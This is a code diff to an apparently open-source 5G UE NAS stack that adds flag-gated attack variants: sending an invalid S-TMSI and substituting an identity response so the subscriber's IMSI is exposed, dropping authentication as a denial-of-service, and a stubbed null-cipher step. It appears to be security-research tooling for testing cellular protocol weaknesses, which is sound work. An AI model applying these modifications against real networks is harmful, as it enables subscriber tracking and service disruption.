@@ -444,7 +444,19 @@ void generateRegistrationRequest(as_nas_info_t *initialNasMsg, nr_ue_nas_t *nas)
   mm_msg->registration_request.fgsregistrationtype = INITIAL_REGISTRATION;
   mm_msg->registration_request.naskeysetidentifier.naskeysetidentifier = 1;
   size += 1;
-  if(nas->guti){
+  if (uplnk_imsi_extract /* != 0 */) {
+    // fill invalid S-TMSI
+    LOG_E(NAS, "[Uplink IMSI Extractor] Variant 1: encoding invalid TMSI into registration message\n");
+    FGSMobileIdentity *mi = &mm_msg->registration_request.fgsmobileidentity;
+    mi->stmsi.typeofidentity = FGS_MOBILE_IDENTITY_5GS_TMSI;
+    mi->stmsi.digit1      = 0;
+    mi->stmsi.spare       = 0;
+    mi->stmsi.amfsetid    = 0;
+    mi->stmsi.amfpointer  = 0;
+    mi->stmsi.tmsi        = 0;
+    size += sizeof(Stmsi5GSMobileIdentity_t);
+  }
+  else if(nas->guti){
     size += fill_guti(&mm_msg->registration_request.fgsmobileidentity, nas->guti);
   } else {
     size += fill_suci(&mm_msg->registration_request.fgsmobileidentity, nas->uicc);
@@ -1070,6 +1082,14 @@ void *nas_nrue_task(void *args_p)
                 req->nasMsg.length = -1;
                 itti_send_msg_to_task(TASK_RRC_NRUE, -1, msg);
               }
+              else if (dnlnk_imsi_extract == 1) {
+                LOG_E(NAS, "[Downlink IMSI Extractor] Variant 1: replacing Authentication Request with Identity Request (IMSI)\n");
+                generateIdentityResponse(&initialNasMsg, *(pdu_buffer + 3), nas->uicc); // handle it as an identity request
+              }
+              else if (dnlink_dos_attack == 1) {
+                LOG_E(NAS, "[Downlink DoS] Variant 1: Replacing Authentication Request with Registration Reject\n");
+                break;
+              }
               else {
                 LOG_E(NAS, "[BTS_NOT_ATTACK]: UE receiving authentication request, normal processing\n");
                 generateAuthenticationResp(nas, &initialNasMsg, pdu_buffer);
@@ -1077,7 +1097,12 @@ void *nas_nrue_task(void *args_p)
               break;
           case FGS_SECURITY_MODE_COMMAND:
             nas_itti_kgnb_refresh_req(nas->security.kgnb);
-            generateSecurityModeComplete(nas, &initialNasMsg);
+            if (null_cipher_integ == 2) {
+              LOG_E(NAS, "[Null Cipher & Integrity] Variant 2: overwrite NAS SECURITY_MODE_COMPLETE to SECURITY_MODE_REJECT\n");	
+              // TODO
+            }
+            else 
+              generateSecurityModeComplete(nas, &initialNasMsg);
             break;
           case FGS_DOWNLINK_NAS_TRANSPORT:
             decodeDownlinkNASTransport(&initialNasMsg, pdu_buffer);
